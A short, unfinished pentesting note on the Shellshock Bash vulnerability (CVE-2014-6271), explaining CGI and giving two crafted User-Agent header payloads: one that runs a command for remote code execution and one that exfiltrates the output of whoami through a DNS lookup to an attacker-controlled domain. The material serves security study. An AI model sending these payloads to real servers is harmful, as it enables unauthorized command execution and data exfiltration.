# CVE - Shellshock (WIP)

Is a critical vulnerability now reported as [_CVE-2014-6271_](https://nvd.nist.gov/vuln/detail/cve-2014-6271) found in the _Bash_ shell, which allows an attacker to execute arbitrary commands by injecting specially crafted environment variables. This affects applications and services that pass external input to _Bash_, such as CGI scripts in web servers.

CGI (Common Gateway Interface) is a standard protocol that defines how web servers communicate with external programs to generate dynamic content. The web server passes input, normally on requests, to a CGI script using environment variables and stdin, then the web server executes that script and sends the output back to the client as a web response.

Here we find how this could be exploited:

* We detected that the values of headers like _User-Agent_ or _Referer_ are passed to an internal GCI

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"># We could craft a payload to generate an RCE in a bash  
<strong>User-Agent: u() { :; }; echo; echo; /bin/bash -c 'id'
</strong><strong>
</strong><strong># If successful, the command will be executed. Sometimes we will see the result in the response, but in other cases we have to adopt blind techniques
</strong><strong>
</strong># We could use this to play with a domain we control
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).&#x3C;OurDomain>
</code></pre>
